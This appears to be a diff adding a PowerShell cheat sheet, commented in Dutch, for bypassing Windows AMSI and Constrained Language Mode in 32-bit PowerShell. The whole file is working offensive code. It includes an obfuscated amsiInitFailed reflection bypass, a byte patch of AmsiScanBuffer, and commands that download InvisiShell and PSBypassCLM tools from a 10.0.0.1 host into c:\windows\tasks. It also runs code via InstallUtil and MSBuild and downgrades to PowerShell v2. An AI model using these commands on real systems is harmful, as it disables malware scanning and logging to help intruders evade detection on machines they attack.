@@ -1,0 +1,46 @@
+# AMSI + CLM Bypass — x86 (32-bit PowerShell)
+# Check architectuur: [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture
+# Tip: Vanuit x86 PS bereik je x64 via: %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
+
+# --- AMSI Bypass ---
+
+# Methode 1: Reflection (amsiInitFailed) — primair, raakt geen native bytes
+$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils');$f=$r.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)
+
+# Methode 2: Memory patch x86 — stdcall ABI, 6 parameters = 24 bytes stackopruiming (ret 24)
+$Win32=@" using System;using System.Runtime.InteropServices; public class Win32x86{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32x86;$l=[Win32x86]::LoadLibrary("amsi.dll");$a=[Win32x86]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32x86]::VirtualProtect($a,[uint32]5,0x40,[ref]$p)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x31,0xC0,0xC2,0x18,0x00),0,$a,5)
+# Patch bytes: xor eax,eax (31 C0) + ret 24 (C2 18 00) = 5 bytes
+# ret 24 ruimt 6 stdcall-args op (6 x 4 = 24 bytes) — zonder dit crasht de stack
+
+# Methode 3: InvisiShell x86 (omzeilt AMSI + script block logging + module logging)
+iwr -Uri 'http://10.0.0.1/tools/InvisiShell_x86.dll' -OutFile 'c:\windows\tasks\InvisiShell_x86.dll' -TimeoutSec 300
+iwr -Uri 'http://10.0.0.1/tools/RunWithRegistryNonAdmin.bat' -OutFile 'c:\windows\tasks\RunWithRegistryNonAdmin.bat' -TimeoutSec 300
+iwr -Uri 'http://10.0.0.1/tools/RunWithPathAsAdmin.bat' -OutFile 'c:\windows\tasks\RunWithPathAsAdmin.bat' -TimeoutSec 300
+# Pas COR_PROFILER_PATH in de bat aan naar InvisiShell_x86.dll pad
+# Zonder admin: cd c:\windows\tasks && RunWithRegistryNonAdmin.bat
+# Met admin:    cd c:\windows\tasks && RunWithPathAsAdmin.bat
+# Exit Invisi-Shell sessie met: exit
+
+# --- CLM Bypass ---
+
+# Methode 1: Custom runspace (arch-onafhankelijk managed code)
+powershell -c "$rs=[runspacefactory]::CreateRunspace();$rs.ApartmentState='STA';$rs.ThreadOptions='ReuseThread';$rs.Open();$p=$rs.CreatePipeline();$p.Commands.AddScript('whoami');$p.Invoke()"
+
+# Methode 2: PSBypassCLM x86 via InstallUtil 32-bit
+iwr -Uri 'http://10.0.0.1/tools/PSBypassCLM_x86.exe' -OutFile 'c:\windows\tasks\PSBypassCLM_x86.exe' -TimeoutSec 300
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\tasks\PSBypassCLM_x86.exe
+
+# Methode 3: MSBuild x86 inline C# task
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\tasks\clm_bypass.xml
+
+# Methode 4: Stap over naar x64 PS (omzeilt CLM als policy alleen x86 treft)
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass
+
+# Methode 5: PowerShell v2 (geen CLM, geen AMSI — vereist .NET 2.0/3.5)
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -version 2 -ep bypass
+
+# Check language mode:
+$ExecutionContext.SessionState.LanguageMode
+# Tip: x86 PS herkent je aan: [IntPtr]::Size -eq 4
+# Tip: SysWOW64 = 32-bit binaries op 64-bit Windows; sysnative = 64-bit binaries vanuit x86
+# Tip: CLM blokkeert Add-Type en New-Object — custom runspace omzeilt dit volledig
